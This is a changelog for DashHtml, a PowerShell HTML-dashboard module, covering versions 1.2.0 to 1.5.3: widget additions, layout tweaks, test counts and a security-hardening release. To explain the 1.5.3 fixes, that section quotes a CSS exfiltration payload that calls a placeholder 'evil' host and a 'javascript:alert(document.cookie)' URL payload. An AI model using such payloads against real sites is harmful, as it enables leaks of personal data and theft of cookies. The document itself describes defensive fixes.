# Changelog

All notable changes to DashHtml are documented here.
Format follows [Keep a Changelog](https://keepachangelog.com/en/1.0.0/).
Versioning follows [Semantic Versioning](https://semver.org/spec/v2.0.0.html).

## [Unreleased]

## [1.5.3] — 2026-06-20

Security hardening. Closes three concrete vectors flagged in the v1.5.2 audit. **No breaking changes** for any caller passing well-formed colours and URLs.

### Security
- **CSS injection via colour fields — closed.** `Add-DhPieChart` slice `Color` and `Add-DhLineChart` series `Color` are now validated through `Test-DhSafeCssColor` against a fixed allowlist (`#hex` 3/4/6/8 digit, `rgb()`/`rgba()`, `hsl()`/`hsla()`, `var(--token)`, single CSS named colour). Previously these strings were HTML-encoded but reached the inline `style="background: …"` markup with CSS metacharacters (`;`, `:`, `(`, `)`) intact, so a caller piping untrusted data into a colour could inject arbitrary CSS rules — including `background-image: url(http://evil/log?u=PII)` for data exfiltration.
- **`javascript:` URL execution via Action.Url — closed.** `Add-DhAlertBanner -Action @{Url=…}` and `Add-DhSummary` tile `Action.Url` are now validated through `Test-DhSafeActionUrl`. Allowed schemes are `http:`, `https:`, `mailto:`, `tel:`, and a leading `#` (in-page anchor). Anything else throws at declaration time, preventing `javascript:alert(document.cookie)`-style payloads from reaching `window.open()` in the dashboard origin.
- **CDN supply-chain attack — closed.** The three `<script>` tags loaded from cdnjs (`xlsx`, `jspdf`, `jspdf-autotable`) now carry SRI `integrity="sha384-…"` attributes pinned to the bundled library versions. A compromised CDN or HTTPS-MITM proxy can no longer swap the script body — the browser refuses to execute a tampered file. `referrerpolicy="no-referrer"` also added so the user's dashboard path isn't leaked to cdnjs on each load.

### Changed
- **`ConvertTo-DhJsonString` now escapes U+2028 / U+2029** as their explicit ` ` / ` ` JSON sequence. Modern JS engines accept these inside string literals (ES2019+), but older parsers, linters, and log forwarders treat them as raw line terminators and could break the embedded `<script>` block when a label value happened to contain one.
- **Help text on `Add-DhTabs`, `Add-DhAlertBanner`, and `Add-DhCollapsible`** now carries the same explicit SECURITY note that `Add-DhHtmlBlock` already had, spelling out the raw-HTML / never-pass-untrusted-data contract. The four cmdlets behaved identically in 1.5.2 — only `Add-DhHtmlBlock` was documented as such. Callers piping `$user.Description` into `-Message`, `-Content`, or per-tab `Content` should now see the warning at `Get-Help` time.

### Implementation
- `Private/Test-DhSafeInput.ps1` (new) — exposes `Test-DhSafeCssColor` and `Test-DhSafeActionUrl`. Both throw on invalid input with a deterministic, descriptive message including the caller context. Auto-imported by the existing `Private/*.ps1` loader in `DashHtml.psm1`.
- `Public/Add-DhPieChart.ps1`, `Public/Add-DhLineChart.ps1` — slice/series `Color` normalisation pipeline now routes through `Test-DhSafeCssColor`.
- `Public/Add-DhAlertBanner.ps1`, `Public/Add-DhSummary.ps1` — `Action.Url` normalisation routes through `Test-DhSafeActionUrl` before the normalised hashtable is built.
- `Public/Export-DhDashboard.ps1` — `<script>` tags for cdnjs scripts now include `integrity=` (computed against the exact bundled versions) and `referrerpolicy="no-referrer"`.
- `Private/ConvertTo-DhJsonString.ps1` — final pass appends ` ` / ` ` escaping.

### Tests
- **14 new Pester scenarios** under five `Security:` Describe blocks. 322 tests total (was 308). New tests cover: PieChart Color allowlist (positive & negative cases including a literal CSS-injection payload), LineChart Color allowlist, AlertBanner `Action.Url` scheme allowlist (rejects `javascript:` and `data:`, accepts http/https/mailto/tel/#), Summary tile Action URL, `ConvertTo-DhJsonString` U+2028/U+2029 escape round-trip, and an end-to-end check that the generated HTML carries `integrity="sha384-…"` on all three CDN script tags.

## [1.5.2] — 2026-06-19

Topology map usability pass. Fully backward compatible; the new behaviour is opt-in via `-AutoFitWidth` on `Add-DhTopologyMap`, but the styled hover tooltip is on by default for every topology block (it replaces the OS-default `title` attribute that was already in use).

### Added
- **`-AutoFitWidth` switch + `-AutoFitMaxWidth` parameter on `Add-DhTopologyMap`** — when set, the JS renderer measures the widest label / icon / badge combination across all nodes using a hidden canvas and grows `NodeWidth` to fit, capped at `-AutoFitMaxWidth` (default 360 px). Removes the truncated-FQDN problem that hits wide-fan trees rendered at the 140 px default.
- **Styled hover tooltip on every topology node** — a single body-level overlay positioned via JS surfaces either the explicit `Tooltip` (when supplied) or the node's full `Label` as a fallback. Replaces the OS-default tooltip, which was both slow to appear and unstyled. Works on SVG node groups (CSS `::after` / `::before` do not render on SVG elements, hence the body-level overlay approach).

### Implementation
- `Public/Add-DhTopologyMap.ps1` — new `[switch] $AutoFitWidth` and `[ValidateRange(140,600)] [int] $AutoFitMaxWidth = 360` parameters; both emitted in the block hashtable.
- `Public/Export-DhDashboard.ps1` — `topologymap` JSON now carries `autoFitWidth` and `autoFitMaxWidth`.
- `Private/Get-DhJsContent.ps1` — new `_topoMeasureText()` (lazy `<canvas>` instance), `_topoEnsureTooltip()` / `_topoShowTooltip()` / `_topoHideTooltip()` helpers. `renderTopologyMap()` runs the auto-fit pass on the global node set before layout (per-node would break the parent-centring maths) and wires `mouseenter` / `mousemove` / `mouseleave` / `focusin` / `focusout` on every `.topo-node`.
- `Private/Get-DhCssBase.ps1` — new `.topo-tooltip` rule (fixed position, themed via existing tokens).

## [1.5.1] — 2026-06-19

Collapsible chrome now available on every block cmdlet (and on `Add-DhTable` and `Add-DhAlertBanner`), matching the `Add-DhSummary` pattern introduced in 1.3.2. Fully backward compatible at the parameter level; **default is `$true` per cmdlet so existing dashboards immediately gain folding headers**. Pass `-Collapsible:$false` per call to keep the flat 1.5.0 look.

### Added
- **`-Collapsible` and `-DefaultOpen` parameters on every block cmdlet** — `Add-DhBarChart`, `Add-DhBullet`, `Add-DhEventFeed`, `Add-DhFilterCard`, `Add-DhHeatmap`, `Add-DhHtmlBlock`, `Add-DhLineChart`, `Add-DhPieChart`, `Add-DhStatusGrid`, `Add-DhTabs`, `Add-DhTopologyMap`. Both default to `$true`. When enabled, the block's outer container becomes a `.collapsible-section` with a clickable header bar (chevron + click-to-toggle) using the same chrome as `Add-DhCollapsible` / `Add-DhSummary`. The inner renderer is unchanged — a new central JS helper `wrapCollapsibleBlock()` rewrites the host container before dispatch and strips the inner block's `title`/`icon` so they don't render twice.
- **`-Collapsible`, `-DefaultOpen`, `-Icon` on `Add-DhTable`** — the existing `<section class="table-section">` now optionally hosts a clickable `<button class="table-section-toggle">` header above a foldable `.table-section-body` that wraps the toolbar, table, paging, and link badge. The outer `<section>` stays as the nav target so `showSubPanel()` routing is unaffected. The new `-Icon` parameter places an optional glyph next to the table title.
- **`-Collapsible`, `-DefaultOpen`, `-Title` on `Add-DhAlertBanner`** — the banner gains a clickable header bar that folds the message body. Action + dismiss buttons stay outside the collapse so they remain reachable when the body is closed. `-Title` defaults to a severity-derived label (`'Alert'` / `'Notice'` / `'Warning'` / `'Critical'`).

### Changed
- **Default rendering is now collapsible** — this is a visible behaviour change for every existing dashboard. If a customer needs the pre-1.5.1 flat look, add `-Collapsible:$false` on each affected call. Tested against the existing 308 Pester scenarios; all pass with the new default.

### Implementation
- `Get-DhJsContent.ps1` — new `wrapCollapsibleBlock(outer, block)` helper and a refactored `renderBlocks()` central dispatcher. Block types that already own their own chrome (`'collapsible'`, `'summarystrip'`) are passed through unwrapped via a `_SELF_COLLAPSIBLE` lookup. New `initTableCollapsibles()` runs once at DOMContentLoaded to wire `.table-section-toggle` click handlers. `renderAlerts()` grows a `if (alert.collapsible) {…}` branch for the banner-specific wrap.
- `Build-DhTableSections.ps1` — emits `<button class="table-section-toggle">` + `<div class="table-section-body">` wrappers when the table opted in.
- `Get-DhCssBase.ps1` — new `.table-section-toggle` / `.table-section-body` / `.table-section-chevron` rules and `.alert-banner-collapsible` rules for the per-banner wrap.
- `Export-DhDashboard.ps1` — single shared `$bCollStr` / `$bDoStr` pair computed once per block; appended to every block-emit line in the `switch ($b.BlockType)` (11 cases). Banner emit grows three new keys (`collapsible`, `defaultOpen`, `title`).

## [1.5.0] — 2026-05-25

Tier A widget expansion: inline tabbed content, 2-D heatmaps, and parent-child topology trees. Closes out the three remaining spec widgets from the v1.4 plan (`docs/v1.4-plan.md`). Fully backward compatible.

### Added
- **`Add-DhTabs` cmdlet** — inline tabbed content block. Local pivot within one section of the dashboard flow; distinct from `NavGroup` which partitions the whole page. Each tab is a `@{Title; Content; Icon?; Active?}` hashtable; `Content` is raw HTML following the same policy as `Add-DhHtmlBlock`. First tab auto-marks active when none specifies `Active=$true`. Full W3C accessibility pattern: `role="tablist" / "tab" / "tabpanel"`, `aria-selected`, `aria-controls`, arrow-key navigation between tabs, and a `focus-visible` outline.
- **`Add-DhHeatmap` cmdlet** — `Rows × Columns` matrix with a numeric colour scale. Distinct from `Add-DhStatusGrid` which is categorical RAG; the heatmap interpolates between two CSS-themed colours. `-ColorScale 'sequential'` (default — chart-1 → chart-2) or `'diverging'` (chart-1 → border-subtle → chart-3, centred on a midpoint). `-Min` / `-Max` auto-fit from the supplied cell values when omitted. `-Unit` suffixes the cell readout when `-ShowValues` is set. `-CellSize 'small'` / `'normal'` / `'large'`. Hard ceiling at `-MaxCells` (default 5000) with a soft warning above 1000 cells.
- **`Add-DhTopologyMap` cmdlet** — parent-child tree visualisation for hierarchies (AD Forest → Domain → DC, vCenter → Cluster → Host, network device chains, etc.). Each node is `@{Id; Label; Parent?; Status?; Icon?; Badge?; Tooltip?; LinkTableId?; LinkFilter?}`. Recursive subtree-width layout — simple tidy SVG tree, no force-directed graphs. `-Direction 'vertical'` (parent above children, default) or `'horizontal'` (parent left of children). `-NodeWidth` / `-NodeHeight` per-node dimensions. Cycle detection rejects loops; missing parents throw. Clickable nodes (`LinkTableId` set) navigate to a registered table with optional pre-filter, reusing the same machinery as `Add-DhStatusGrid` cells and `Add-DhAlertBanner -Action`. Status colouring reuses the cell-`ok` / `warn` / `danger` / `nodata` palette so trees inherit the active theme.

### Tests
- 26 new Pester tests (5 for Tabs, 7 for Heatmap, 14 for TopologyMap). Suite total: **308** (up from 282 at 1.4.2).

## [1.4.2] — 2026-05-25

### Added
- **`Add-DhAlertBanner` — `-NavGroup` / `-NavSubGroup`**: banners can now bind to a specific nav panel instead of being page-global. Without the params, behaviour is unchanged from 1.4.x (banner shows on every panel). New CSS rule `.alert-banner[data-navgroup]:not(.panel-active) { display: none; }` keeps grouped banners hidden until their tab is active.
- **`Add-DhSummary` — per-tile `Action` (click-to-jump)**: optional `Action=@{TableId?; Filter?; Url?; Label?}` hashtable on any tile (any style: tile / bignumber / gauge) makes the whole tile clickable. Mirrors the `Add-DhAlertBanner -Action` shape — provide either `TableId` (jump to a registered table, with optional `Filter` pre-applied) or `Url` (open in a new tab). Validation: exactly one of TableId / Url is required. Keyboard accessible (Enter / Space). Adds `.tile-clickable` CSS with focus-visible outline.
- **`New-DhDashboard` — `-AutoRefresh`**: optional duration string (`'30s'`, `'5m'`, `'1h'`, or plain seconds) that emits a `<meta http-equiv="refresh">` tag in `<head>`. Useful for wall-display ops dashboards. Omit / pass `''` to disable (default).
- **Native hover tooltips** on pie slices and bar-chart bars — shows the label / count / percentage on hover via the browser-native `title=""` attribute. No JS library, zero overhead. For pies it's a nested `<title>` SVG element; for bars it's a `title` attribute on `.bar-item`.

### Tests
- 16 new Pester tests (4 for NavGroup banners, 6 for tile Action, 6 for AutoRefresh). Suite total: **282** (up from 266).

## [1.4.1] — 2026-05-25

### Added
- **`Add-DhSummary` — per-NavGroup KPI strips**: new `-NavGroup` / `-NavSubGroup` / `-Id` parameters. When `-NavGroup` is set, the strip lives in the per-panel block flow (visible only when its nav group is active); without `-NavGroup`, the legacy top-of-page singleton behaviour is preserved. Multiple per-group strips coexist with one global strip — each panel in a two-tier nav can have its own KPI hero row. `-Id` auto-derives from the NavGroup name (slugified) when omitted. Duplicate-Id guard prevents accidentally clobbering a strip when the same NavGroup is supplied twice.
- **New JS block type `'summarystrip'`** with a top-level `renderSummaryStrip(container, block)` renderer that reuses every existing tile helper (standard / bignumber / gauge / sparkline / delta).
- **New example `Examples/Multi-Panel-Dashboard.ps1`** — focused showcase of the multi-summary feature with three nav groups (Identity / Infrastructure / Finance), each with its own KPI strip + matching content.
- **Moved** `Invoke-Demo-DashHtml.ps1` from the repo root to `Examples/` and refreshed it to exercise the full v1.4 widget set (banner, gauge, bignumber, bullet, line, pie, status grid, event feed, sparkline cells, per-group summary). The `-Theme` ValidateSet now includes `Rag`. Stale `Demo-DashHtml-*.html` outputs at the repo root removed.

### Fixed
- **JS helper hoisting (latent ReferenceError)**: `pickThresholdClass`, `classToAccent`, `classToAccentBg`, and the tile-builder helpers (`buildTile`, `buildStandardTile`, `buildBignumberTile`, `buildGaugeTile`, `tileFormatValue`, `tileDeltaHtml`, `tileSparklineHtml`) were nested inside `renderSummary()` but called by `buildBulletRow` and `renderLineChart` from module scope. Under strict-mode JS, nested function declarations don't leak — those calls would have thrown `ReferenceError` in a browser. The Pester tests pattern-match emitted HTML text rather than executing the JS, so the regression slipped through. All helpers are now at module scope and reused identically by `renderSummary`, `renderSummaryStrip`, `renderBullet`, and `renderLineChart`.

### Tests
- 9 new tests covering per-group summary storage, NavGroup → block dispatch, auto-Id slugification, NavSubGroup carry-through, multiple-strip coexistence, duplicate-Id throw, legacy backward-compat, and full HTML round-trip with `renderSummaryStrip` + `data-navgroup` attribute. Suite total: **266 tests**, all passing.

## [1.4.0] — 2026-05-23

### Theme
**KPI & Dashboard Primitives.** Major widget expansion driven by the IT-infrastructure KPI dashboard specification (`docs/KPI_Dashboard_Specification.docx`, see also `docs/v1.4-plan.md`). 13 of 16 spec widgets now ship as first-class cmdlets. Tile sparklines, trend deltas, gauge + big-number variants, line / area / bullet / pie charts, status matrix, event feed, alert banner, and a unified `-Rag` parameter shape that finally aligns the threshold model with the Office/Excel RAG palette via the new `Rag` theme family. **Fully backward compatible** — every pre-v1.4 dashboard renders identically. **257 Pester tests pass** (up from 116 at the start of v1.4 work).

### Added
- **`Add-DhAlertBanner` cmdlet** — new top-of-page alert strip rendered above the KPI summary tiles. First feature landed from the v1.4 "KPI & Dashboard Primitives" scope (see [`docs/v1.4-plan.md`](docs/v1.4-plan.md), Feature F6). Supports four severity levels (`info` / `ok` / `warning` / `critical`) mapped onto the existing `cell-ok` / `cell-warn` / `cell-danger` palette so colours follow the active theme. Optional `-Dismissible` switch adds a close button with dismissal state persisted in the URL hash (survives page reload, resets in a new browser session). Optional `-Action` parameter adds a button that either navigates to a registered table (with optional pre-filter text) or opens an external URL. Multiple banners stack in declaration order. Distinct from `Add-DhCollapsible` (which is in-content) and from the planned `Add-DhEventFeed` (which is a chronological log). 15 new Pester tests bring the suite to 131.
- **`Add-DhPieChart` cmdlet** — standalone pie / donut chart as a first-class block (v1.4 plan Feature F7). Two data modes: **Mode A** derives counts from a registered table column (with `-TopN` cap and optional `-ClickFilters` for click-to-filter on the source table); **Mode B** takes explicit `-Slices @(@{ Label; Value; Color })` for non-tabular data (cost breakdowns, weighted distributions). `-Style` chooses between `'donut'` (default — total shown in centre hole) and `'pie'` (solid disc). Per-slice custom colours via the optional `Color` key in Mode B. Reuses the existing chart palette (`--chart-1`..`--chart-8`). 17 new Pester tests bring the suite to 148.
- **`Add-DhSummary` — tile sparklines** (v1.4 plan Feature F2). Each tile hashtable can carry an inline mini-chart via four new optional keys: `Sparkline` (numeric array — non-numeric items are dropped with a warning), `SparklineStyle` (`'line'` default / `'area'` / `'bars'`), `SparklineMin` / `SparklineMax` (optional fixed Y-axis bounds). Pure SVG, ~120×24 px, uses the active theme's `--chart-1` accent. New top-level `SPARK.build()` JS helper — reusable by the planned sparkline table cell type (F8) — sits alongside the existing `chartPalette()` / `buildPieSvg()` helpers. Works in both flat and collapsible summary variants. 10 new Pester tests bring the suite to 158.
- **`Add-DhStatusGrid` cmdlet** — rows × columns RAG status matrix (v1.4 plan Feature F5 — the "Status Matrix / Health Grid" widget called out in the IT-infrastructure KPI dashboard specification §2). Use for binary or low-cardinality state across many entities: services × regions, DCs × replication links, hosts × probes. Per-cell keys: `Row` + `Column` (must appear in the `-Rows` / `-Columns` axes — typos throw), `Status` (`'ok'` / `'warn'` / `'danger'` / `'nodata'` / `'info'`), optional `Tooltip` (native `title=""` hover), optional `LinkTableId` + `LinkFilter` (clicking the cell navigates to the named table and applies the filter, reusing the same hook as `Add-DhAlertBanner -Action`). Cmdlet params: `-RowLabel` / `-ColumnLabel` (axis captions in the top-left corner), `-CellSize` (`'small'` 32px / `'normal'` 48px default / `'large'` 64px), `-MaxCells` (hard ceiling, default 2000 — a soft warning fires above 200 cells). Cells you don't declare render as a faint dashed neutral state. Auto-generated legend strip below the grid shows the statuses actually present. Responsive: below 600px viewport the grid collapses to a stacked list with coloured stripes per row. 11 new Pester tests bring the suite to **257**. **This is the last feature on the v1.4 roadmap** (`docs/v1.4-plan.md`).
- **`Add-DhEventFeed` cmdlet** — chronological severity-tagged event list (v1.4 plan Feature F11). The canonical "Row 5" of the IT-infrastructure KPI dashboard specification (§4.1 AD layout, §4.2 vSphere layout) — the audit trail that pairs with the at-a-glance KPI tiles above. **Distinct from `Add-DhAlertBanner`** (banner = single current condition rendered above the summary; event feed = chronological history rendered as an inline block). Per-event keys: `Timestamp` + `Severity` + `Message` required, `Source` and `Icon` optional. Severities `info` / `ok` / `warning` / `critical` reuse the existing RAG palette. Cmdlet params: `-MaxItems` (default 50, range 1..1000), `-GroupBy` (`'None'` default / `'Severity'` / `'Source'` — when grouped, `'Severity'` orders critical → warning → ok → info, `'Source'` is alphabetical), `-SortDescending` (default `$true`). Pure DOM/list rendering — no SVG, no library. 12 new Pester tests bring the suite to 246.
- **Sparkline cell type on `Add-DhTable` columns** (v1.4 plan Feature F8). New `CellType='sparkline'` value renders each row's array as an inline mini-chart inside the cell — same SVG (`SPARK.build`) used by tile sparklines (F2), so the visual language stays consistent across the dashboard. Column-level keys: `SortBy` (`'last'` default / `'avg'` / `'max'` / `'min'` / `'sum'` — how clicking the header sorts rows by reducing each row's array to a comparable scalar) and `SparklineStyle` (`'line'` default / `'area'` / `'bars'`). Threshold colouring and per-cell `Format` are skipped for sparkline columns since the value is an array, not a scalar. Null / missing values render as a muted em-dash. Row JSON emitter extended to preserve array values as JSON arrays (was previously stringified). Existing 'text' / 'progressbar' / 'badge' cell types are now also explicitly validated by a ValidateSet — unknown CellType values throw. 6 new Pester tests bring the suite to 234.
- **`Add-DhBarChart` — `-Stacked` + `-SeriesField`** (v1.4 plan Feature F12). New optional switch + companion parameter on the existing cmdlet for "primary aggregation by `-Field`, segmented by `-SeriesField`" breakdowns (resource breakdowns, error-type distributions per the spec §2). Series colours pulled from the active theme's `--chart-1..8` palette and assigned in alphabetical order of the seriesField values so the legend stays stable across renders. Each primary bar is sized by total count (same scale as single-series), with internal flex segments proportional to each series value's share of THAT bar. Click-to-filter (`-ClickFilters`) is intentionally a single-series-only feature — stacked bars have no single value to filter by; passing both is a no-op. Convenience: supplying `-SeriesField` alone auto-stacks (you don't *also* need `-Stacked`). Validation: `-Stacked` requires `-SeriesField`; `-SeriesField` must differ from `-Field`. **Backward compatible** — single-series calls unchanged. New JS `renderBarChartStacked` branch + `.bar-track-stacked` / `.bar-segment` / `.bar-chart-legend` CSS. 6 new Pester tests bring the suite to 228.
- **`Add-DhLineChart` cmdlet** — time-series line / area chart with axes, multi-series support, and an optional dashed target / threshold annotation line (v1.4 plan Feature F9 — the biggest single gap per the IT-infrastructure KPI dashboard specification §7.4: *"Always pair a time-series chart with a threshold annotation line."*). Parameters: `-XAxis` (string-array category labels), `-Series` (array of `@{Label;Values[];Class;Color}` — `Class` maps to the RAG palette, `Color` is an explicit override, `Values` must match `XAxis` length, `$null` entries are allowed as line breaks), `-Filled` (area variant), `-TargetLine` + `-TargetLabel`, `-YAxisMin` / `-YAxisMax` / `-YAxisUnit`, `-ShowLegend` / `-ShowGrid` (defaults `$true`), `-Height` (80–1000, default 240). Pure SVG, no library dependency — 800×Height viewBox stretches horizontally to fit the container; Y-axis auto-fits from the data with 5% padding when bounds are omitted. Threshold line auto-extends the visible Y range so it never clips. 14 new Pester tests bring the suite to 222.
- **`Add-DhBullet` cmdlet** — bullet chart for actual-vs-target with RAG performance bands (v1.4 plan Feature F10). The canonical visualisation called out in the IT-infrastructure KPI dashboard specification (§2) for SLA latency, CPU/memory headroom, overcommit ratios, etc. `-Items` accepts an array of bullet specs; each renders as one horizontal row stacked vertically inside the block. Per-item keys: `Label`, `Value` (numeric), optional `Target`, `Min` / `Max` (default 0..100), `Unit` (readout suffix), `Class` (value-bar colour override), plus either modern `Rag` (unified shape from F13) or legacy `Thresholds` / `Bands` arrays (`Bands` is a documented alias). First consumer of the F13 `-Rag` shape — bullets pair naturally with `Add-DhSummary -Style 'gauge'` tiles (gauge = compact at-a-glance, bullet = detailed per-entity row). Pure SVG renderer (new `renderBullet` + `buildBulletRow` + `classToAccentBg` helper, all reusing the existing `pickThresholdClass` / `classToAccent`). 12 new Pester tests bring the suite to 208.
- **Unified `-Rag` parameter shape on `Add-DhSummary` items and `Add-DhTable` columns** (v1.4 plan Feature F13 cmdlet wiring). Replaces or supplements the existing `Thresholds=@(@{Min;Max;Class})` shape with a more readable mapping: `@{ Green=@{Max=70}; Amber=@{Min=70;Max=90}; Red=@{Min=90}; NoData=$true }`. Bound to `cell-ok` / `cell-warn` / `cell-danger` automatically. `NoData=$true` is the opt-in that lets a gauge accept `Value=$null` (painted `cell-nodata` at render) and lets table columns colour null / missing cells with `cell-nodata` instead of leaving them blank. Both `-Rag` and the legacy `Thresholds=` shape can be supplied on the same item / column — `Rag` wins. Unknown top-level or band-level keys throw, so typos surface as errors. New private `ConvertTo-DhRagThresholds` normaliser; new `ragNoData` flag on column and gauge JSON; new JS branch in `getThresholdClass` and `buildGaugeTile`. 11 new Pester tests bring the suite to 196.
- **New `Rag` theme family + fourth `cell-nodata` RAG state across all themes** (v1.4 plan Feature F13 palette work). `New-DhDashboard -Theme Rag` selects a new sixth family that uses the IT-infrastructure KPI dashboard specification's exact Office/Excel RAG palette (§7.2): GREEN `#375623 / #E2EFDA`, AMBER `#7F4B00 / #FFF2CC`, RED `#9C0006 / #FFDCE1`, GREY `#595959 / #F2F2F2`. The dark variant uses Office dark-mode RAG companions (`#A9D08E` / `#FFD966` / `#FF7E7E` / `#A6A6A6`). For users who need strict spreadsheet parity (compliance, audit, finance reports) without retuning brand-aligned shades in the other five families. Every theme — including the original five — now also defines a new `--cell-nodata-fg` / `--cell-nodata-bg` token pair so missing / unmeasured / collection-failed values render visually distinct from `0` or `OK`. Available everywhere existing RAG classes worked: table cell thresholds (`Class='cell-nodata'`), summary tile `Class`, html-block `-Style 'nodata'`, collapsible card `BadgeClass`, plus the `badge-nodata` / `fill-nodata` / `row-hl-nodata` modifiers. Backward compatible — the existing five themes keep their brand-aligned GREEN/AMBER/RED values unchanged; only the new no-data state is added on top. 3 new theme tests + updated cross-family coverage bring the suite to 185.
- **`Add-DhSummary` — tile styles: `bignumber` and `gauge`** (v1.4 plan Features F3 + F4). New per-item `Style` key dispatches between three renderers: `'tile'` (default — unchanged), `'bignumber'` (full-width hero tile, 2.4–3.6 rem value typography, optional `Caption` line), `'gauge'` (140×80 semicircle SVG with background arc and threshold-coloured filled arc). Gauge accepts `Min` / `Max` / `Unit` and `Thresholds=@(@{ Min=...; Max=...; Class='cell-...' })` using the same shape as `Add-DhTable` column thresholds — with "highest matching Min wins" semantics so the spec-friendly Min-only pattern is supported. New top-level JS helpers `pickThresholdClass()` and `classToAccent()`. 10 new Pester tests bring the suite to 182.
- **`Add-DhSummary` — trend & delta indicators** (v1.4 plan Feature F1). Each tile hashtable can carry four new optional keys: `Previous` (baseline value — when supplied, the arrow direction and delta are auto-derived), `Trend` (`'auto'` default / `'up'` / `'down'` / `'flat'` — explicit override or use without a numeric baseline), `TrendIsGood` (nullable bool to flip the colour semantics for "lower is better" metrics like error counts or latency), `DeltaFormat` (`'both'` default / `'percent'` / `'absolute'`). Renders a compact `▲ +12 (+5.5%)` line between the value and the label, coloured via the active theme's RAG palette tokens (`--cell-ok-fg` / `--cell-danger-fg` / `--text-muted`). New top-level `DELTA.build()` JS helper. Handles `Previous=0` (no percent), zero-delta (`±0`), and explicit-Trend-without-Previous (arrow alone) gracefully. 14 new Pester tests bring the suite to 172.

### Fixed
- **Locale-sensitive `[double]::TryParse` calls in v1.4 normalisers** — `Previous`, `SparklineMin`, `SparklineMax`, individual `Sparkline` array elements, and `Add-DhPieChart` slice `Value` are now parsed with `InvariantCulture` instead of `CurrentCulture`. The previous behaviour silently corrupted decimals on locales like `it-IT` where the period is a thousands separator (`Previous=92330.25` became `9233025`). PowerShell's `[string]` cast on a double already uses invariant format, so the parse must match. Regression test added.

### Changed
- **JS chart renderer refactor (internal)** — extracted shared `chartPalette()` and `buildPieSvg()` helpers in the embedded JS so the new `Add-DhPieChart` block and the pre-existing per-table chart (`Add-DhTable -Charts`) render identically. The per-table `_buildPieChart` now delegates to `buildPieSvg`. No visible change for existing dashboards — verified by the 131-test pre-refactor suite passing unchanged.

### Documentation
- **README — multiple new sections**: Tile styles, Trend and delta indicators, Inline sparklines on tiles, Alert banners, Pie / Donut charts, Bullet charts, Line / Area charts, Event feed, Status Grid, Sparkline cells, Unified `-Rag` parameter, `Rag` theme + `cell-nodata` state, Declaration order. Plus two example scripts (`Examples/AD-Dashboard.ps1`, `Examples/vSphere-Dashboard.ps1`) mirroring the spec's §4.1 and §4.2 reference layouts.
- **`docs/v1.4-plan.md` + `docs/KPI_Dashboard_Specification.docx`** — the v1.4 design plan and the IT-infrastructure KPI dashboard spec that drove this release are now in the repo for posterity.

## [1.3.3] — 2026-05-19

### Fixed
- **Three-tier nav — `-NavSubGroup` now binds blocks to a subgroup**: Previously, when a group containing subgroups was opened, the subgroup pill strip was rendered but **no pill was active**, so all blocks tagged with `-NavSubGroup` were shown together. The pill only filtered them after the user clicked one. This made `-NavSubGroup` on `Add-DhHtmlBlock` (and the other block cmdlets) effectively an opt-in filter rather than a binding.
  - `showGroup()` in `Get-DhJsContent.ps1` now auto-activates the first pill of the entered group via `showSubGroup()`. As a result, items tagged with `-NavSubGroup` are visible only when their pill is active. Items in the group **without** `-NavSubGroup` remain visible regardless of the active pill, as documented.
  - No script changes required — existing two-tier scripts (no `-NavSubGroup` anywhere) are unaffected because no pills are emitted.

## [1.3.2] — 2026-05-15

### Added
- **`Add-DhSummary` — collapsible KPI strip**: The KPI tile strip is now wrapped in a collapsible container that mirrors the look & feel of `Add-DhCollapsible`, with a header badge showing the tile count. Three companion parameters let you customise the header: `-Title` (defaults to `'Summary'`), `-Icon` (optional emoji / unicode glyph), and `-DefaultOpen` (defaults to `$true`). Collapsibility is **on by default** — existing scripts get the new look with no code changes. Pass `-Collapsible:$false` to revert to the flat pre-1.3.2 tile strip.

### Changed
- **`Add-DhSummary` — default rendering**: The default rendering now includes a collapsible header above the tile strip. This is a visible behaviour change for existing scripts; if you prefer the flat strip with no header, add `-Collapsible:$false`.

### Documentation
- **README — declaration order note**: New "Declaration order (important)" section explaining that tables must be declared before any dependent object (`Add-DhFilterCard` / `Add-DhBarChart` / `Set-DhTableLink`). This is the most common source of "filter does nothing" issues during script authoring.

## [1.3.1] — 2026-04-29

### Changed
- **Table row hover — visibility**: The `--bg-row-hover` colour token was bumped to a noticeably more saturated shade in every built-in theme (Default, Azure, VMware, Grey, Company — light + dark variants) and in the inline `theme-forced-*` fallbacks in `Get-DhCssBase.ps1`. Previously the hover background sat very close to `--bg-table` / `--bg-row-alt`, making the highlight barely perceptible.
- **Table row hover — accent edge**: `.data-table tbody tr:hover` now also draws a 3 px inset box-shadow on the left edge using `--accent-primary`, mirroring the visual affordance of `.row-selected` and giving the hovered row a clear focal cue regardless of the chosen theme.

## [1.3.0] — 2026-04-22

### Added
- **Three-tier navigation — `-NavSubGroup` parameter**: New optional `-NavSubGroup` parameter on `Add-DhTable`, `Add-DhHtmlBlock`, `Add-DhCollapsible`, `Add-DhFilterCard`, and `Add-DhBarChart`. When used together with `-NavGroup`, a third pill-shaped nav strip appears below the subnav bar and filters items within the active group by subgroup. Clicking a pill narrows the group view to items tagged with that subgroup; clicking the active pill again clears the filter. Items inside a group that have no `NavSubGroup` remain visible regardless of pill state. Fully backward compatible — existing scripts work unchanged.
- **Collapsible card width — `-CardWidth` parameter**: `Add-DhCollapsible` accepts `small` | `normal` (default) | `large` | `xlarge` | `auto`. Controls the `min-width`/`max-width` of each card in the grid (`small` 150–220 px, `normal` 200–320 px, `large` 280–480 px, `xlarge` 360–640 px, `auto` 240 px min and no upper bound).

## [1.2.2] — 2026-04-15

### Changed
- **Layout — horizontal padding tuned**: Horizontal padding on `.report-body`, `.nav-inner`, and `.subnav-inner` increased from `8px` (`--space-sm`) to `16px` (`--space-md`) for better visual balance after the widescreen layout change in 1.2.1.

## [1.2.1] — 2026-04-15

### Changed
- **Layout — widescreen padding**: `max-width` on `.report-body`, `.nav-inner`, and `.subnav-inner` increased from `1600px` to `2400px`; horizontal padding reduced from `24px` (`--space-lg`) to `8px` (`--space-sm`) on all three containers. On a typical 1920px display this reduces the empty side margin from ~184px to ~8px per side.

## [1.2.0] — 2026-04-15

### Changed
- **Nav bar — logo removed**: The logo image is no longer rendered inside the sticky nav bar. The header logo is unaffected.
- **Nav bar — `NavTitle` default**: `New-DhDashboard` now defaults `NavTitle` to `''` (empty string) instead of the report title, resulting in a cleaner nav bar showing only navigation links by default. Pass `-NavTitle 'My Label'` explicitly to restore a label.
- **Filter/chart section spacing**: Reduced `margin-bottom` on `.filter-card-section` and `.bar-chart-section` from `16px` to `4px`, top padding on `.filter-card-section` from `8px` to `6px`, top/bottom padding on `.bar-chart-section` from `16px` to `8px`, and title `margin-bottom` from `8–16px` to `4px` for a tighter layout.

### Fixed
